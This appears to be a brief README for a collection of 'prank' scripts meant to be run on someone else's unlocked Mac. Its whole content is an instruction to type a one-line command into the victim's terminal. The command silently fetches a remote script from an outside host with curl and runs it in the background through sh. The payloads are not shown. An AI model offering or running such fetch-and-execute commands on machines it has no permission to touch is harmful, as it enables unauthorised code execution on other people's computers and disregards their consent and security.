      when someone leaves their computer unlocked, you want to do something. this is a repository of silly things you can do. they all follow the same idea. all you have to do is run
      <pre><code>sh <(curl -sL hoku.me/xx) &</code></pre>
      in their terminal, where `xx` is the two-letter identifier of the prank payload. (they only work on macs)
